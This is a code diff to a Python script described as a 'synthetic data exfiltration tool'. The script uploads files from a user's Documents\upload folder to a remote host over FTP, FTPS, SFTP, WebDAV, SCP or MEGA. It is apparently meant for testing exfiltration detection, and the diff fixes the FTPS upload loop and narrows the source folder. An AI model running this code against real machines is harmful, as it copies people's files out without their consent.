@@ -33,9 +33,9 @@ def ftpExfiltration(host, user, passwd, fileList):
 
     return
 
-def ftpsExfiltration(host, user, passwd, filelist):
+def ftpsExfiltration(host, user, passwd, fileList):
     with FTP_TLS(host) as ftps:
-       
+
         ftps.login(user=user, passwd=passwd)
         logging.debug('FTPS logon, user: %s', user)
 
@@ -47,24 +47,11 @@ def ftpsExfiltration(host, user, passwd, filelist):
 
         # ftps.set_pasv(True)
 
-        # for filename in fileList: 
-        #     print(f'{filename=}')
-        #     ftps.storbinary('STOR ' + filename, open(filename, 'rb'))
-        ftps.cwd('c:/CPH_Python')
-        ftps.pwd()
-        # ftps.sendcmd('TYPE I')
-        # ftps.sendcmd('EPSV')
-        # ftps.sendcmd('PASV')
-        # ftps.sendcmd('STOR ftps.txt')
-        # f = open('ftps.txt', 'rb')
-        ftps.storbinary('STOR ftps.txt', open('ftps.txt', 'rb'))
-       
-        open()
-        # f.close()
-        ftps.sendcmd('EPSV')
+        for filename in fileList: 
+             print(f'{filename=}')
+             ftps.storbinary('STOR ' + filename, open(filename, 'rb'))
+        
         ftps.quit()
-
-    return
 
 def sftpExfiltration(host, user, passwd, fileList):
     cnopts = pysftp.CnOpts()
@@ -184,7 +171,7 @@ def dataExfiltration(protocol, host, user, passwd, source, include):
     startDirectory = os.getcwd()
 
     # set as appropriate
-    source = os.environ['USERPROFILE']+'\\Documents'
+    source = os.environ['USERPROFILE']+'\\Documents\\upload'
     os.chdir(source)
 
     fileList=buildFileList(includeTuple)
@@ -212,28 +199,30 @@ def dataExfiltration(protocol, host, user, passwd, source, include):
 
 if __name__ == '__main__':
     # define comamnd line arguemnts
-    parser = argparse.ArgumentParser(description="Synthetic data exfiltration tool")
+    parser = argparse.ArgumentParser(description="Synthetic data exfiltration tool. Specify a protocol and a target host and the script " \
+                                     "will copy files from the .\\Documents\\upload folder. The include option can be used to used to specify a file " \
+                                     "of extensions to use as an include filter. For FTPS the server must have TLS session resue = no.")
     parser.add_argument('protocol',
-                        help='Specifies the protocol to be used, ftp, ftps, sftp, WebDAV, scp or mega',
-                        type=str,
+                        help='Specify the protocol to be used: FTP, FTPS, SFTP, WebDAV, SCP or MEGA',
+                        type=str.lower,
                         choices=['ftp','ftps','sftp','webdav','scp','mega'])
     parser.add_argument('--host',
-                        help='Specifies the host name or IP address of the host, required if protocol is ftp/ftps/sftp/webdav/scp',
+                        help='Specify the host name or IP address of the target, required if the protocol is FTP/FTPS/SFTP/WebDAV/SCP',
                         type=str
                         )
     parser.add_argument('--user',
                         '-l', 
-                        help='Optional, specifies the login name or email. Anonymous will be used if not specifieed',
+                        help='Optional, specify the login name or email. Anonymous will be used if not specifieed',
                         type=str
                         )
     parser.add_argument('--passwd',
                         '-p', 
-                        help='Optional, specifies the password',
+                        help='Optional, specify the password',
                         type=str
                         )
     parser.add_argument('--include',
                         '-i', 
-                        help='Optional, specifies the file holding the include filename extensions (e.g. .xlsx, .docx)',
+                        help='Optional, specify a file holding the include filename extensions, one per line (e.g. .xlsx, .docx)',
                         type=str
                         )
     parser.add_argument('--verbose',
@@ -263,7 +252,7 @@ if __name__ == '__main__':
         args.include = ""
         logging.debug('No file type filter file specified')
 
-    # source simply defaults to %USERPROFILE%\Documents at the moment
+    # source simply defaults to %USERPROFILE%\Documents\upload at the moment
     source =''
 
     dataExfiltration(args.protocol, args.host, args.user,args.passwd, source, args.include)
